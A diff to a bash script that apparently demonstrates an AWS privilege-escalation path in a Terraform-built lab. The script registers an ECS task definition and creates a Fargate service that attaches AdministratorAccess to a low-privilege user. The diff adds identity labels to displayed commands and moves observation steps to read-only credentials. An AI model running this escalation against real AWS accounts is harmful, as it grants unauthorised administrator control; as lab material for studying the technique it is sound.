@@ -21,14 +21,16 @@ CYAN='\033[0;36m'
 # Track attack commands for summary
 ATTACK_COMMANDS=()
 
-# Display a command before executing it
+# Display a non-attack command with identity context
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
-# Display AND record an attack command
+# Display AND record an attack command with identity context
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -66,12 +68,12 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
-# Extract admin cleanup credentials for observation/polling steps
-ADMIN_ACCESS_KEY=$(terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null)
-ADMIN_SECRET_KEY=$(terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null)
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
 
-if [ -z "$ADMIN_ACCESS_KEY" ] || [ "$ADMIN_ACCESS_KEY" == "null" ]; then
-    echo -e "${RED}Error: Could not find admin cleanup credentials in terraform output${NC}"
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
     exit 1
 fi
 
@@ -98,9 +100,9 @@ use_starting_user_creds() {
     export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
     unset AWS_SESSION_TOKEN
 }
-use_admin_creds() {
-    export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY"
-    export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY"
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
     unset AWS_SESSION_TOKEN
 }
 
@@ -112,7 +114,7 @@ export AWS_REGION=$AWS_REGION
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -124,7 +126,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -132,7 +134,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # [EXPLOIT] Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -142,7 +144,7 @@ echo ""
 
 # [OBSERVATION] Step 5: Check for attached policies (using admin creds)
 echo -e "${YELLOW}Step 5: Checking current policies attached to starting user${NC}"
-use_admin_creds
+use_readonly_creds
 echo "Listing attached policies for: $STARTING_USER"
 ATTACHED_POLICIES=$(aws iam list-attached-user-policies --user-name $STARTING_USER --query 'AttachedPolicies[*].PolicyName' --output text)
 if [ -z "$ATTACHED_POLICIES" ]; then
@@ -200,7 +202,7 @@ EOF
 )
 
 echo "Registering task definition..."
-show_attack_cmd "aws ecs register-task-definition --region $AWS_REGION --cli-input-json \"...\""
+show_attack_cmd "Attacker" "aws ecs register-task-definition --region $AWS_REGION --cli-input-json \"...\""
 TASK_DEF_RESULT=$(aws ecs register-task-definition \
     --region $AWS_REGION \
     --cli-input-json "$TASK_DEFINITION" \
@@ -220,7 +222,7 @@ echo ""
 
 # [OBSERVATION] Step 7: Get default VPC and subnet for ECS service (using admin creds)
 echo -e "${YELLOW}Step 7: Finding network configuration for ECS service${NC}"
-use_admin_creds
+use_readonly_creds
 
 # Get default VPC
 DEFAULT_VPC=$(aws ec2 describe-vpcs \
@@ -261,7 +263,7 @@ echo "Service Name: $SERVICE_NAME"
 echo "This service will launch a task that attaches AdministratorAccess policy to: $STARTING_USER"
 echo ""
 
-show_attack_cmd "aws ecs create-service --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --service-name $SERVICE_NAME --task-definition \"$TASK_DEFINITION_FAMILY:$TASK_DEF_REVISION\" --desired-count 1 --launch-type FARGATE --network-configuration \"awsvpcConfiguration={subnets=[$DEFAULT_SUBNET],assignPublicIp=ENABLED}\""
+show_attack_cmd "Attacker" "aws ecs create-service --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --service-name $SERVICE_NAME --task-definition \"$TASK_DEFINITION_FAMILY:$TASK_DEF_REVISION\" --desired-count 1 --launch-type FARGATE --network-configuration \"awsvpcConfiguration={subnets=[$DEFAULT_SUBNET],assignPublicIp=ENABLED}\""
 CREATE_SERVICE_RESULT=$(aws ecs create-service \
     --region $AWS_REGION \
     --cluster $ECS_CLUSTER_NAME \
@@ -284,7 +286,7 @@ echo ""
 
 # [OBSERVATION] Step 9: Wait for service to launch task and complete (using admin creds)
 echo -e "${YELLOW}Step 9: Waiting for ECS service to launch and complete task${NC}"
-use_admin_creds
+use_readonly_creds
 echo "Monitoring service status..."
 
 MAX_ATTEMPTS=30
@@ -295,7 +297,7 @@ while [ $ATTEMPT -lt $MAX_ATTEMPTS ]; do
     ATTEMPT=$((ATTEMPT + 1))
 
     # Get service status
-    show_cmd "aws ecs describe-services --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --services $SERVICE_NAME --output json"
+    show_cmd "ReadOnly" "aws ecs describe-services --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --services $SERVICE_NAME --output json"
     SERVICE_INFO=$(aws ecs describe-services \
         --region $AWS_REGION \
         --cluster $ECS_CLUSTER_NAME \
@@ -331,7 +333,7 @@ while [ $ATTEMPT -lt $MAX_ATTEMPTS ]; do
                 while [ $TASK_WAIT -lt $MAX_TASK_WAIT ]; do
                     TASK_WAIT=$((TASK_WAIT + 1))
 
-                    show_cmd "aws ecs describe-tasks --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --tasks $TASK_ARN --output json"
+                    show_cmd "ReadOnly" "aws ecs describe-tasks --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --tasks $TASK_ARN --output json"
                     TASK_INFO=$(aws ecs describe-tasks \
                         --region $AWS_REGION \
                         --cluster $ECS_CLUSTER_NAME \
@@ -407,7 +409,7 @@ use_starting_user_creds
 echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 
-show_cmd "aws iam list-users --max-items 3 --output table"
+show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
